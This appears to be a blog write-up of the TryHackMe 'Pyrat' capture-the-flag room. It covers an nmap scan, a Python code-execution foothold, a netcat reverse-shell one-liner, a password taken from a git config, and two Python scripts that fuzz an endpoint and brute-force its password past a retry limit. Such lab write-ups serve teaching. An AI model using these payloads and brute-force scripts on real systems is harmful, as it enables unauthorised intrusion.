---
title: "Pyrat"
description: "
Writeup of the 'Easy' Tryhackme room: Pyrat
"
author: "squ4r00t"
date: 2024-10-09 00:00:00 +0800
categories: [CTFs, Tryhackme]
tags: [writeup, tryhackme]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/2024-10-09-writeup-tryhackme-pyrat/pyrat.webp
---

### Overview
___
Pyrat is an “Easy” room where we encounter a rather “unusual” python HTTP server returning a curious response. With more testing, we realise that it is vulnerable to Python code execution which gives us foothold into the box. After some exploration, we find files that help us better understand how the Python server work and with some fuzzing with a custom script we finally get root access.
Initial Scan

We start with the nmap scan on all ports:

```bash
nmap -A -T4 -p- -oN nmap 10.10.167.212

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 04:20 CEST
Nmap scan report for 10.10.167.212
Host is up (0.072s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop:
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions:
|     invalid syntax (<string>, line 1)
|   GetRequest:
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest:
|     name 'OPTIONS' is not defined
|   Help:
|_    name 'HELP' is not defined
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=10/9%Time=6705E88E%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,1,"\n")%r(GetRequest,1A,"name\x20'GET'\x20is\x20not\x20de
SF:fined\n")%r(X11Probe,2D,"source\x20code\x20string\x20cannot\x20contain\
SF:x20null\x20bytes\n")%r(FourOhFourRequest,22,"invalid\x20syntax\x20\(<st
SF:ring>,\x20line\x201\)\n")%r(Socks4,2D,"source\x20code\x20string\x20cann
SF:ot\x20contain\x20null\x20bytes\n")%r(HTTPOptions,1E,"name\x20'OPTIONS'\
SF:x20is\x20not\x20defined\n")%r(RTSPRequest,1E,"name\x20'OPTIONS'\x20is\x
SF:20not\x20defined\n")%r(DNSVersionBindReqTCP,2D,"source\x20code\x20strin
SF:g\x20cannot\x20contain\x20null\x20bytes\n")%r(DNSStatusRequestTCP,2D,"s
SF:ource\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Hel
SF:p,1B,"name\x20'HELP'\x20is\x20not\x20defined\n")%r(LPDString,22,"invali
SF:d\x20syntax\x20\(<string>,\x20line\x201\)\n")%r(SIPOptions,22,"invalid\
SF:x20syntax\x20\(<string>,\x20line\x201\)\n")%r(LANDesk-RC,2D,"source\x20
SF:code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(NotesRPC,2D,
SF:"source\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(J
SF:avaRMI,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20byt
SF:es\n")%r(afp,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\
SF:x20bytes\n")%r(giop,2D,"source\x20code\x20string\x20cannot\x20contain\x
SF:20null\x20bytes\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 223.21 seconds
```

We have 2 ports open:
- 22 for ssh
- 8000 for a Python Http server

### Python HTTP Server

When we navigate to http://10.10.167.212:8000 we get the message: “Try a more basic connection!”

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/try_more_basic.webp)

Let’s try it with curl too:

```bash
curl http://10.10.167.212:8000 -i
```

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/try_with_curl.webp)

We can see in the response headers that the server is `SimpleHTTP/0.6 Python/3.11.2` and the response body is the same as before: "Try a more basic connection."

Seeing this, what comes in mind is to try connecting via netcat as follows:

```bash
nc 10.10.167.212 8000
```

With this command, we establish a connection with the server but we get nothing from it. Let’s try and see if we can run python code

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/py_code_exec.webp)

We can see that the server executed our code. We can now try to get a reverse shell using the following one-liner payload:

```python
import os; os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <LHOST> <LPORT> >/tmp/f")
```

Don’t forget to replace `<LHOST>` and `<LPORT>` with the IP and Port of your listener.

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/rev_shell.webp)

We got a shell back!

After some exploration, we stumble upon an interesting folder at `/opt/dev`. Listing the contents of this folder we see that it’s a git repository.

When we try to execute basic git commands we get an error basically saying that this repo doesn’t belong to our user:

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/dubious_ownership_git.webp)

We can see that the user `think` is the owner of this repo.

With further digging, we find a password inside `/opt/dev/.git/config`:

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/think_user_password.webp)

If we try this password with ssh, we are able to login to the machine as think and get the user flag at `/home/think/user.txt`:

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/user_flag.webp)

Now that we have a shell as think, let’s see what was in that git repository.

```bash
git status
```

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/git_status.webp)

We can see that there was a file named `pyrat.py.old`. Let’s restore it and see its contents:

```bash
git restore pyrat.py.old
```

The file has the following content:

```python
...............................................

def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e

...............................................
```

Reading the code, we see that the application will behave differently based on the data provided to it. Additionally, if we read the description of the room:

> A subsequent exploration yields valuable insights into the application’s older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint

we can infer that there is another endpoint ( like `shell` ) and we are supposed to fuzz the server in order to find it.

But before that, let’s see how the server behaves when it is provided a valid endpoint vs when it is given an invalid endpoint.

For the valid endpoint, let’s just try `shell`:

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/valid_endpoint.webp)

We can see that the shell endpoint works as shown in the python code (it spawns a shell). Now for an invalid endpoint (`invalid123`):

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/invalid_endpoint.webp)

We get the message: “name ‘invalid123’ is not defined”.

Now we have enough information to write a script that will help us discover new endpoints.

```python
import socket

# Defining variables
RHOST = "10.10.137.243"
RPORT = 8000
WORDLIST_PATH = "/usr/share/wordlists/dirb/common.txt"

# Creating a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Setting a timeout for the socket (2 seconds)
s.settimeout(2)

# Connecting to the server
s.connect((RHOST, RPORT))

# Opening the wordlist file in "read" mode
wlist = open(WORDLIST_PATH, "r")

for endpoint in wlist:
    print(f"[i] Trying {endpoint.strip()}")
    try:
        s.sendall(endpoint.strip().encode())
        response = s.recv(1024).decode()
        if "is not defined" not in response and "<string>" not in response and response.strip() != "":
            print(f"[+] {endpoint.strip()} might be a valid endpoint. It returned: {response}")
            choice = input("Continue? [y/n] -> ")
            if choice != "y":
                exit(0)
    except socket.timeout:
        print(f"[!] Timeout for {endpoint.strip()}")
        continue

wlist.close()
```

This script will first connect to the server with help of the socket module. Once connected, it will loop through the wordlist (defined in the WORDLIST_PATH variable) and send each of the word to the server. If the response from the server fulfills the following criteria:

- Does not contain "is not defined" : This is the response we got earlier for an invalid endpoint
- Does not contain "`<string>`" : For some words, the server will return and error usually containing "`<string>`"
- Is not empty

It is considered a potential valid endpoint and the script prompt us if we want to continue or not.

> Feel free to improve the script to your liking

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/endpoint_fuzz_script.webp)

After running the script, we eventually get the right endpoint. Let’s try it!

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/entering_valid_endpoint.webp)

We are prompted for a password…

If we go back to the room’s description:

> Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.

We see that we are supposed to brute-force the password too. As we did previously, let’s see how the application behaves when given an invalid password.

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/3_wrong_pass.webp)

We see that after 3 attempts, the server stops asking for the password and behaves like we just connected to it. So let’s try re-entering the valid endpoint:

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/re_enter_valid_endpoint.webp)

After re-entering the valid endpoint, we get prompted for the password again…

So our script has to send the valid endpoint, try 3 passwords, send the valid endpoint, try 3 passwords, so on and so forth.

```python
import socket
import time
import os

# Defining variables
RHOST = "10.10.137.243"
RPORT = 8000
WORDLIST_PATH = "/opt/seclists/Passwords/Leaked-Databases/rockyou-75.txt"

# Connecting to socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(3.0)
s.connect((RHOST, RPORT))

# Opening the wordlist file
wlist = open(WORDLIST_PATH, "r")

# Creating temporary wordlist
temp_wlist = open("/tmp/tmp_wlist", "a")
for index, password in enumerate(wlist):
    if index % 3 == 0:
        temp_wlist.write("<REDACTED>\n")
    temp_wlist.write(password)

# Closing wordlist files
wlist.close()
temp_wlist.close()

# Looping through temporary wordlist file
temp_wlist = open("/tmp/tmp_wlist", "r")
for line in temp_wlist.readlines():
    time.sleep(0.5)
    print(f"[i] Trying {line.strip()}")
    try:
        s.sendall(line.strip().encode())
        response = s.recv(1024).decode()

        if response != "Password:\n":
            print(f"[+] {line.strip()} might be the password. It returned: {response}")
            choice = input("Continue? [y/n] -> ")
            if choice != "y":
                exit(0)
    except socket.timeout:
        print("[-] Response timeout!")
        continue

# Closing temporary wordlist file
temp_wlist.close()

# Deleting temporary file
os.system("rm /tmp/tmp_wlist")
```

This script is similar to the first one, the difference being it will create a temporary wordlist from the provided wordlist in the WORDLIST_PATH variable. This temporary wordlist will contain the valid endpoint once every 4 words, for example:

**Original wordlist**

```
pass1
pass2
pass3
pass4
pass5
```

**Temporary wordlist**

```
<REDACTED>
pass1
pass2
pass3
<REDACTED>
pass4
pass5
```

> `<REDACTED>` being the valid endpoint

If we run the script:

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/brute_force_script.webp)

Well, looks like we got it…

![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/root_flag.webp)

We spawn a shell as root and get the root flag at /root/root.txt.